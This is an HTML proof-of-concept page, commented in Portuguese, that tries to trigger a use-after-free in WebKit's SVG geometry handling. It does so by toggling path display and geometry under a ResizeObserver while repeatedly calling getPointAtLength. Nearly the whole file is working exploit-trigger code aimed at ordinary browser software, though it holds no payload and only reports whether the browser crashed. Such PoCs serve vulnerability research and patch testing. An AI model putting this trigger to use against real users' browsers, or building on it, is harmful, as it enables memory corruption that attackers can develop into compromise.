<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>SVGGeometryElement UAF PoC</title>
</head>
<body>
    <div id="container">
        <!-- Elemento SVG alvo -->
        <svg width="200" height="200">
            <path id="targetPath" d="M 10,10 L 100,100" stroke="black" fill="none" />
        </svg>
    </div>

    <div id="status" style="font-family: monospace; margin-top: 15px;">Executando...</div>

    <script>
    const path = document.getElementById('targetPath');
    const status = document.getElementById('status');

    try {
        // 1. Garante que o renderer inicial exista
        path.getTotalLength();

        // 2. Registra um ResizeObserver / Mutation Observer síncrono para mutar a árvore
        // durante o recálculo forçado de layout
        if (window.ResizeObserver) {
            const ro = new ResizeObserver(() => {
                // Remove o renderer forçando display: none
                path.style.display = 'none';
            });
            ro.observe(path);
        }

        // 3. Modifica a geometria para sujar o layout (dirty layout)
        path.setAttribute('d', 'M 0,0 L 500,500');

        // 4. Dispara getPointAtLength que guarda o renderer bruto e chama getTotalLength()
        // No WebKit vulnerável, a reavaliação de layout dentro de getTotalLength()
        // destrói o renderer antigo e causa o UAF ao retornar.
        for (let i = 0; i < 50; i++) {
            path.style.display = (i % 2 === 0) ? 'inline' : 'block';
            path.setAttribute('d', 'M 0,0 L ' + (100 + i) + ',100');
            
            // Ponto crítico do UAF:
            path.getPointAtLength(50);
        }

        status.innerText = "Teste finalizado: Sobreviveu (sem crash).";
    } catch (e) {
        status.innerText = "Erro durante execução: " + e.message;
    }
    </script>
</body>
</html>
